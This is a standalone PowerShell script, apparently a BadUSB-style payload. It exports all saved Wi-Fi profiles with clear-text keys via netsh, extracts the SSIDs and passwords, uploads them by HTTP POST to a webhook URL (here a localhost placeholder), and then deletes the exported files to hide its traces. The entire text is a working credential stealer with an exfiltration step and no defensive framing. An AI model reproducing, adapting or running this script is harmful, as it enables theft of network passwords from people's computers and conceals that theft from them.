# Change directory to %temp%
Set-Location $env:TEMP

# Export Wi-Fi profiles with passwords
netsh wlan export profile key=clear > $null

# Extract SSIDs and Passwords from the exported XML files
$wifiData = @()
foreach ($file in Get-ChildItem -Path . -Filter "Wi-Fi*.xml") {
    $xml = [xml](Get-Content $file.FullName)
    $ssid = $xml.WLANProfile.SSIDConfig.SSID.name
    $password = $xml.WLANProfile.MSM.security.sharedKey.keyMaterial
    if ($ssid -and $password) {
        $wifiData += "SSID: $ssid, Password: $password"
    }
}

# Save the organized data to a text file
$outputFile = "Wi-Fi-Info-$($env:COMPUTERNAME)-$((Get-Date).ToString('yyyyMMddHHmmss')).txt"
$wifiData | Out-File $outputFile -Force

# Send the organized data to the webhook
Invoke-WebRequest -Uri "http://localhost/webhook/webhook.php" -Method POST -InFile $outputFile > $null

# Clean up temporary files
Remove-Item Wi-Fi*.xml -Force -ErrorAction SilentlyContinue
Remove-Item $outputFile -Force -ErrorAction SilentlyContinue
